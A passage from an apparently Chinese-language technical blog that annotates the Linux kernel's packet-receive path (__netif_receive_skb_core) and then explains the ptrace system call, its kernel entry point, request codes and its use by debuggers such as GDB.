skb_vlan_untag(skb);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!skb))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (skb_skip_tc_classify(skb))</span><br><span class="line">		<span class="keyword">goto</span> skip_classify;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pfmemalloc)</span><br><span class="line">		<span class="keyword">goto</span> skip_taps;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* ptype_all容器中协议处理(tcpdump抓包就在这里) */</span></span><br><span class="line">	list_for_each_entry_rcu(ptype, &amp;ptype_all, <span class="built_in">list</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (pt_prev)</span><br><span class="line">			ret = deliver_skb(skb, pt_prev, orig_dev);</span><br><span class="line">		pt_prev = ptype;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* dev-&gt;ptype_all容器中协议处理(和设备有关) */</span></span><br><span class="line">	list_for_each_entry_rcu(ptype, &amp;skb-&gt;dev-&gt;ptype_all, <span class="built_in">list</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (pt_prev)</span><br><span class="line">			ret = deliver_skb(skb, pt_prev, orig_dev);</span><br><span class="line">		pt_prev = ptype;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">skip_taps:</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NET_INGRESS</span></span><br><span class="line">	<span class="keyword">if</span> (static_branch_unlikely(&amp;ingress_needed_key)) &#123;</span><br><span class="line">		skb = sch_handle_ingress(skb, &amp;pt_prev, &amp;ret, orig_dev);</span><br><span class="line">		<span class="keyword">if</span> (!skb)</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (nf_ingress(skb, &amp;pt_prev, &amp;ret, orig_dev) &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	skb_reset_tc(skb);</span><br><span class="line">skip_classify:</span><br><span class="line">	<span class="keyword">if</span> (pfmemalloc &amp;&amp; !skb_pfmemalloc_protocol(skb))</span><br><span class="line">		<span class="keyword">goto</span> drop;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 对vlan报文的处理 */</span></span><br><span class="line">	<span class="keyword">if</span> (skb_vlan_tag_present(skb)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (pt_prev) &#123;</span><br><span class="line">			ret = deliver_skb(skb, pt_prev, orig_dev);</span><br><span class="line">			pt_prev = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (vlan_do_receive(&amp;skb))</span><br><span class="line">			<span class="keyword">goto</span> another_round;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (unlikely(!skb))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 调用接收设备的rx_handler */</span></span><br><span class="line">	rx_handler = rcu_dereference(skb-&gt;dev-&gt;rx_handler);</span><br><span class="line">	<span class="keyword">if</span> (rx_handler) &#123;</span><br><span class="line">		<span class="keyword">if</span> (pt_prev) &#123;</span><br><span class="line">			ret = deliver_skb(skb, pt_prev, orig_dev);</span><br><span class="line">			pt_prev = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">switch</span> (rx_handler(&amp;skb)) &#123;</span><br><span class="line">		<span class="keyword">case</span> RX_HANDLER_CONSUMED:</span><br><span class="line">			ret = NET_RX_SUCCESS;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		<span class="keyword">case</span> RX_HANDLER_ANOTHER:</span><br><span class="line">			<span class="keyword">goto</span> another_round;</span><br><span class="line">		<span class="keyword">case</span> RX_HANDLER_EXACT:</span><br><span class="line">			deliver_exact = <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">case</span> RX_HANDLER_PASS:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			BUG();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(skb_vlan_tag_present(skb))) &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb_vlan_tag_get_id(skb))</span><br><span class="line">			skb-&gt;pkt_type = PACKET_OTHERHOST;</span><br><span class="line">		skb-&gt;vlan_tci = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">/* 根据skb-&gt;protocol传递给上层协议(其实这就是&quot;sk_buff=&gt;packet_type&quot;的过程) */</span></span><br><span class="line">	type = skb-&gt;protocol;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (likely(!deliver_exact)) &#123; <span class="comment">/* 根据全局定义的协议处理报文 */</span></span><br><span class="line">		deliver_ptype_list_skb(skb, &amp;pt_prev, orig_dev, type,</span><br><span class="line">				       &amp;ptype_base[ntohs(type) &amp;</span><br><span class="line">						   PTYPE_HASH_MASK]); <span class="comment">/* 利用skb-&gt;protocol在ptype_base中选择对应的双向链表 */</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	deliver_ptype_list_skb(skb, &amp;pt_prev, orig_dev, type,</span><br><span class="line">			       &amp;orig_dev-&gt;ptype_specific); <span class="comment">/* 根据设备上注册的协议进行处理 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(skb-&gt;dev != orig_dev)) &#123; <span class="comment">/* 如果设备发生变化,那么还需要针对新设备的注册协议进行处理 */</span></span><br><span class="line">		deliver_ptype_list_skb(skb, &amp;pt_prev, orig_dev, type,</span><br><span class="line">				       &amp;skb-&gt;dev-&gt;ptype_specific); </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pt_prev) &#123; </span><br><span class="line">		<span class="keyword">if</span> (unlikely(skb_orphan_frags_rx(skb, GFP_ATOMIC)))</span><br><span class="line">			<span class="keyword">goto</span> drop;</span><br><span class="line">		*ppt_prev = pt_prev; <span class="comment">/* 把查找到的packet_type传出 */</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">drop:</span><br><span class="line">		<span class="keyword">if</span> (!deliver_exact)</span><br><span class="line">			atomic_long_inc(&amp;skb-&gt;dev-&gt;rx_dropped);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			atomic_long_inc(&amp;skb-&gt;dev-&gt;rx_nohandler);</span><br><span class="line">		kfree_skb(skb);</span><br><span class="line">		ret = NET_RX_DROP;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>__netif_receive_skb_core</code> 函数主要有几个处理：</p>
<ul>
<li>vlan 报文的处理，主要是循环把 vlan 头剥掉（Virtual Local Area Network 虚拟局域网）</li>
<li>交给 rx_handler 处理（例如：OVS，linux bridge 等）</li>
<li><code>ptype_all</code> 处理（例如：抓包程序，raw socket 等）</li>
<li><code>ptype_base</code> 处理，并交给协议栈（例如：ip、arp，rarp 等）</li>
</ul>
<p>其中我们只需要关注与有关 <code>ptype_base</code> 的部分，这里才是对网络协议的处理：</p>
<ul>
<li>程序会通过 <code>skb-&gt;protocol</code> 找到 <code>ptype_base</code> 中对应的双向链表</li>
<li>遍历这个双向链表，直到 <code>packet_type-&gt;type == sk_buff-&gt;protocol</code></li>
<li>然后调用 <code>packet_type-&gt;func</code> 完成对数据包的处理</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/01/Linux%20ptrace-%E5%8E%9F%E7%90%86%E5%92%8C%E8%BF%90%E7%94%A8/" class="post-title-link" itemprop="url">Linux ptrace-原理和运用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-01 22:35:49" itemprop="dateCreated datePublished" datetime="2022-11-01T22:35:49+08:00">2022-11-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-31 14:29:41" itemprop="dateModified" datetime="2023-03-31T14:29:41+08:00">2023-03-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Linux 系统调用 - ptrace</strong></p>
<p>ptrace 是 Linux 中的一个系统调用，可以让父进程控制子进程运行，并可以检查和改变子进程的核心 image 的功能 </p>
<p>其基本原理是：</p>
<ul>
<li>当使用了 ptrace 跟踪后，所有发送给被跟踪的子进程的信号（除了SIGKILL），都会被转发给父进程</li>
<li>子进程会被阻塞，这时子进程的状态就会被系统标注为 TASK_TRACED</li>
<li>父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行 </li>
</ul>
<p>ptrace 在用户态的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">ptrace</span> <span class="params">(<span class="keyword">enum</span> __ptrace_request request, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> res, ret;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="keyword">pid_t</span> pid;</span><br><span class="line">  <span class="keyword">void</span> *addr, *data;</span><br><span class="line"></span><br><span class="line">  va_start (ap, request);</span><br><span class="line">  pid = va_arg (ap, <span class="keyword">pid_t</span>);</span><br><span class="line">  addr = va_arg (ap, <span class="keyword">void</span> *);</span><br><span class="line">  data = va_arg (ap, <span class="keyword">void</span> *);</span><br><span class="line">  va_end (ap);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (request &gt; <span class="number">0</span> &amp;&amp; request &lt; <span class="number">4</span>)</span><br><span class="line">    data = &amp;ret;</span><br><span class="line"></span><br><span class="line">  res = INLINE_SYSCALL (ptrace, <span class="number">4</span>, request, pid, addr, data);</span><br><span class="line">  <span class="keyword">if</span> (res &gt;= <span class="number">0</span> &amp;&amp; request &gt; <span class="number">0</span> &amp;&amp; request &lt; <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于不同的 ptrace 命令有着不同的参数，简化版本如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="keyword">pid_t</span> pid, <span class="keyword">void</span> *addr, <span class="keyword">void</span> *data)</span></span>;   </span><br></pre></td></tr></table></figure>
<ul>
<li>enum __ptrace_request request：指示了 ptrace 要执行的命令</li>
<li>pid_t pid：指示 ptrace 要跟踪的进程ID</li>
<li>void *addr：指示要监控的内存地址</li>
<li>void *data：存放读取出的或者要写入的数据</li>
</ul>
<p>ptrace 在内核中的接口如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE4(ptrace, <span class="keyword">long</span>, request, <span class="keyword">long</span>, pid, <span class="keyword">unsigned</span> <span class="keyword">long</span>, addr,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">child</span>;</span></span><br><span class="line">	<span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (request == PTRACE_TRACEME) &#123;</span><br><span class="line">		ret = ptrace_traceme();</span><br><span class="line">		<span class="keyword">if</span> (!ret)</span><br><span class="line">			arch_ptrace_attach(current);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	child = find_get_task_by_vpid(pid);</span><br><span class="line">	<span class="keyword">if</span> (!child) &#123;</span><br><span class="line">		ret = -ESRCH;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (request == PTRACE_ATTACH || request == PTRACE_SEIZE) &#123;</span><br><span class="line">		ret = ptrace_attach(child, request, addr, data);</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Some architectures need to do book-keeping after</span></span><br><span class="line"><span class="comment">		 * a ptrace attach.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!ret)</span><br><span class="line">			arch_ptrace_attach(child);</span><br><span class="line">		<span class="keyword">goto</span> out_put_task_struct;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = ptrace_check_attach(child, request == PTRACE_KILL ||</span><br><span class="line">				  request == PTRACE_INTERRUPT);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out_put_task_struct;</span><br><span class="line"></span><br><span class="line">	ret = arch_ptrace(child, request, addr, data);</span><br><span class="line">	<span class="keyword">if</span> (ret || request != PTRACE_DETACH)</span><br><span class="line">		ptrace_unfreeze_traced(child);</span><br><span class="line"></span><br><span class="line"> out_put_task_struct:</span><br><span class="line">	put_task_struct(child);</span><br><span class="line"> out:</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其中对 PTRACE_TRACEME 和 PTRACE_ATTACH 做了特殊处理</li>
</ul>
<p>常见 ptrace 命令如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of the REQUEST argument to `ptrace.&#x27;  */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">ptrace_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* 跟踪发出此请求的进程,此过程接收的所有信号都可以被其父级拦截,其父级可以使用其他&quot;ptrace&quot;请求 */</span></span><br><span class="line">  PTRACE_TRACEME = <span class="number">0</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_TRACE_ME PTRACE_TRACEME</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 返回进程text空间中,地址ADDR处的word(字) */</span></span><br><span class="line">  PTRACE_PEEKTEXT = <span class="number">1</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_READ_I PTRACE_PEEKTEXT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 返回进程data空间中,地址ADDR处的word(字) */</span></span><br><span class="line">  PTRACE_PEEKDATA = <span class="number">2</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_READ_D PTRACE_PEEKDATA</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 返回进程用户区域中,偏移为ADDR的word(字) */</span></span><br><span class="line">  PTRACE_PEEKUSER = <span class="number">3</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_READ_U PTRACE_PEEKUSER</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将一字大小的DATA写入进程的text空间,地址为ADDR */</span></span><br><span class="line">  PTRACE_POKETEXT = <span class="number">4</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_WRITE_I PTRACE_POKETEXT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将一字大小的DATA写入进程的data空间,地址为ADDR */</span></span><br><span class="line">  PTRACE_POKEDATA = <span class="number">5</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_WRITE_D PTRACE_POKEDATA</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 将一字大小的DATA写入进程的用户区域,偏移量为ADDR */</span></span><br><span class="line">  PTRACE_POKEUSER = <span class="number">6</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_WRITE_U PTRACE_POKEUSER</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 继续该process(进程) */</span></span><br><span class="line">  PTRACE_CONT = <span class="number">7</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_CONTINUE PTRACE_CONT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 杀死该process(进程) */</span></span><br><span class="line">  PTRACE_KILL = <span class="number">8</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_KILL PTRACE_KILL</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 单步执行该process(进程) */</span></span><br><span class="line">  PTRACE_SINGLESTEP = <span class="number">9</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_STEP PTRACE_SINGLESTEP</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 附加到正在运行的进程 */</span></span><br><span class="line">  PTRACE_ATTACH = <span class="number">16</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_ATTACH PTRACE_ATTACH</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 从附加到&#x27;PTRACE_ATTACH&#x27;的进程中分离 */</span></span><br><span class="line">  PTRACE_DETACH = <span class="number">17</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_DETACH PTRACE_DETACH</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 继续并在进入系统调用或从系统调用返回时停止 */</span></span><br><span class="line">  PTRACE_SYSCALL = <span class="number">24</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SYSCALL PTRACE_SYSCALL</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置跟踪筛选器选项 */</span></span><br><span class="line">  PTRACE_SETOPTIONS = <span class="number">0x4200</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SETOPTIONS PTRACE_SETOPTIONS</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取最后一条ptrace消息 */</span></span><br><span class="line">  PTRACE_GETEVENTMSG = <span class="number">0x4201</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_GETEVENTMSG PTRACE_GETEVENTMSG</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取流程的siginfo(签名信息) */</span></span><br><span class="line">  PTRACE_GETSIGINFO = <span class="number">0x4202</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_GETSIGINFO PTRACE_GETSIGINFO</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 为进程设置新的siginfo(签名信息) */</span></span><br><span class="line">  PTRACE_SETSIGINFO = <span class="number">0x4203</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PT_SETSIGINFO PTRACE_SETSIGINFO</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取寄存器内容 */</span></span><br><span class="line">  PTRACE_GETREGSET = <span class="number">0x4204</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_GETREGSET PTRACE_GETREGSET</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 设置寄存器内容 */</span></span><br><span class="line">  PTRACE_SETREGSET = <span class="number">0x4205</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SETREGSET PTRACE_SETREGSET</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 类似于&#x27;PTRACE_ATTACH&#x27;,但不要强迫跟踪trap(陷阱),也不会影响signal(信号)或group stop state(组停止状态) */</span></span><br><span class="line">  PTRACE_SEIZE = <span class="number">0x4206</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SEIZE PTRACE_SEIZE</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 陷阱捕获了tracee  */</span></span><br><span class="line">  PTRACE_INTERRUPT = <span class="number">0x4207</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_INTERRUPT PTRACE_INTERRUPT</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 等待下一个group event(事件组) */</span></span><br><span class="line">  PTRACE_LISTEN = <span class="number">0x4208</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_LISTEN PTRACE_LISTEN</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检索siginfo_t结构,而无需从队列中删除信号 */</span></span><br><span class="line">  PTRACE_PEEKSIGINFO = <span class="number">0x4209</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_PEEKSIGINFO PTRACE_PEEKSIGINFO</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取被阻止信号的掩码 */</span></span><br><span class="line">  PTRACE_GETSIGMASK = <span class="number">0x420a</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_GETSIGMASK PTRACE_GETSIGMASK</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 更改被阻止信号的掩码 */</span></span><br><span class="line">  PTRACE_SETSIGMASK = <span class="number">0x420b</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SETSIGMASK PTRACE_SETSIGMASK</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取seccomp BPF筛选器 */</span></span><br><span class="line">  PTRACE_SECCOMP_GET_FILTER = <span class="number">0x420c</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SECCOMP_GET_FILTER PTRACE_SECCOMP_GET_FILTER</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取seccomp BPF筛选器元数据 */</span></span><br><span class="line">  PTRACE_SECCOMP_GET_METADATA = <span class="number">0x420d</span>,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SECCOMP_GET_METADATA PTRACE_SECCOMP_GET_METADATA</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 获取有关系统调用的信息 */</span></span><br><span class="line">  PTRACE_GET_SYSCALL_INFO = <span class="number">0x420e</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_GET_SYSCALL_INFO PTRACE_GET_SYSCALL_INFO</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>ptrace 的使用 - 调试</strong></p>
<p>Linux 调试工具 GDB 的底层就是使用了 ptrace，主要是 PTRACE_ATTACH 功能</p>
<p>在使用 ptrace 之前需要在两个进程间建立追踪关系：（追踪者 tracer 和被追踪者 tracee）</p>
<ul>
<li>ptrace 编程的主要部分是 tracer，它可以通过附着的方式与 tracee 建立追踪关系</li>
<li>建立之后，可以控制 tracee 在特定的时候暂停并向 tracer 发送相应信号，而 tracer 则通过循环等待 waitpid 来处理 tracee 发来的信号</li>
</ul>
<p>其中会用到4个 ptrace 命令：</p>
<ul>
<li>PTRACE_TRACEME：tracee 表明自己想要被追踪，这会自动与父进程建立追踪关系（这也是唯一能被 tracee 使用的 request，其他的 request 都由 tracer 指定）</li>
<li>PTRACE_PEEKUSER：返回进程用户区域中，偏移为ADDR处，一字大小的数据，使用 <code>ORIG_RAX</code> 计算 <code>RAX</code> 的偏移，从而获取将要执行的系统调用号</li>
<li>PTRACE_GETREGS：获取寄存器内容，用结构体 <code>user_regs_struct</code> 进行保存</li>
<li>PTRACE_SYSCALL：在子进程进入和退出系统调用时都将其暂停</li>
</ul>
